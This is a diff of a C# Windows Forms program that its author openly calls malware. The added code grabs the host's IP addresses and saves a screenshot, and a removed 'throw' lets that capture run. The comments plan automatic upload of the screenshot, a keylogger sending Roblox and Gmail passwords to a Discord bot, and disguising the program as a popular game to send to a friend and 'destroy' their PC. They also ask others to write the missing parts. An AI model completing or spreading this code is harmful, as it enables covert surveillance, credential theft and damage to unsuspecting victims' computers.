@@ -149,9 +149,11 @@ namespace WindowsFormsApp1
             Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
             IPEndPoint ep = new IPEndPoint(IPAddress.Loopback, portToBlock);
             s.Bind(ep);
+            // Whatever this function does or somethin
             string password = "Hu11an_!ndusTr!al";
             GCHandle gch = GCHandle.Alloc(password, GCHandleType.Pinned);
             gch.Free();
+            // IP Grabbing
             var host = Dns.GetHostEntry(Dns.GetHostName());
             foreach (var ip in host.AddressList)
             {
@@ -160,108 +162,14 @@ namespace WindowsFormsApp1
                     ip.ToString();
                 }
             }
-            throw new Exception("no");
+            // Capture the screen. I think i should make a way for it to auto-upload to a website.
             Rectangle size = Screen.GetBounds(Point.Empty);
             Bitmap captureBitmap = new Bitmap(size.Width, size.Height, PixelFormat.Format32bppArgb);
             Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
             Graphics captureGraphics = Graphics.FromImage(captureBitmap);
             captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
             captureBitmap.Save(@"Capture.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
-            // Any help on this malware is apreciated.
-            // However i advise not downloading this and using it on your own PC.
-            // If you do download it and you wanna destory someones pc:
-            // Rename it to something convinicing
-            // Like a popular game name and alter the picture to its icon.
-            // Customize then send to a friend
-            // And there PC Will die.
-            // Also im planning on adding a KEY LOGGING SYSTEM.
-            // Which sends it to a discord bot you make in a txt
-            // Like roblox username password
-            // Gmail password and account
-            // More stuff like that so help a guy out please!
-
-
-            /*pictureBox1 = new PictureBox();
-            pictureBox1.BackColor = Color.Transparent;
-            pictureBox1.Height = 300;
-            pictureBox1.Width = 300;
-
-            pictureBox1.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
-                r.Next(0, Screen.PrimaryScreen.Bounds.Height));
-
-            Controls.Add(pictureBox1);
-            pictureBox2 = new PictureBox();
-            pictureBox1.BackColor = Color.Transparent;
-            pictureBox2.Height = 240;
-            pictureBox2.Width = 180;
-
-            pictureBox2.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
-                r.Next(0, Screen.PrimaryScreen.Bounds.Height));
-
-            Controls.Add(pictureBox2);
-            pictureBox3 = new PictureBox();
-            pictureBox1.BackColor = Color.Transparent;
-            pictureBox3.Height = 300;
-            pictureBox3.Width = 300;
-
-            pictureBox3.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
-                r.Next(0, Screen.PrimaryScreen.Bounds.Height));
-
-            Controls.Add(pictureBox3);
-            pictureBox4 = new PictureBox();
-            pictureBox1.BackColor = Color.Transparent;
-            pictureBox4.Height = 300;
-            pictureBox4.Width = 300;
-
-            pictureBox4.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
-                r.Next(0, Screen.PrimaryScreen.Bounds.Height));
-
-            Controls.Add(pictureBox4);
-
-            pictureBox5 = new PictureBox();
-            pictureBox1.BackColor = Color.Transparent;
-            pictureBox5.Height = 150;
-            pictureBox5.Width = 200;
-
-            pictureBox5.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
-                r.Next(0, Screen.PrimaryScreen.Bounds.Height));
-
-            Controls.Add(pictureBox5);
-
-            pictureBox1.Image = bmp;
-            pictureBox2.Image = bmp;
-            pictureBox3.Image = bmp;
-            pictureBox4.Image = bmp;
-            pictureBox5.Image = bmp;
-
-            Bitmap pic = new Bitmap(pictureBox3.Image);
-            for (int y = 0; (y <= (pic.Height - 1)); y++)
-            {
-                for (int x = 0; (x <= (pic.Width - 1)); x++)
-                {
-                    Color inv = pic.GetPixel(x, y);
-                    inv = Color.FromArgb(255, (255 - inv.R), (255 - inv.G), (255 - inv.B));
-                    pic.SetPixel(x, y, inv);
-                }
-            }
-
-            pictureBox3.Image = pic;
-
-            Bitmap pic2 = new Bitmap(pictureBox5.Image);
-            for (int y = 0; (y <= (pic2.Height - 1)); y++)
-            {
-                for (int x = 0; (x <= (pic2.Width - 1)); x++)
-                {
-                    Color inv = pic2.GetPixel(x, y);
-                    inv = Color.FromArgb(255, (255 - inv.R), (255 - inv.G), (255 - inv.B));
-                    pic2.SetPixel(x, y, inv);
-                }
-            }
-
-            pictureBox5.Image = pic2; */
-            //OperatingSystem operating;
-            //operating.Platform = "NoMore";
-            //RegistryKey rk = Registry
+            // This line of code removes the discord app for a bit. (PLEASE CODE THIS FOR ME)
         }
     }
 }
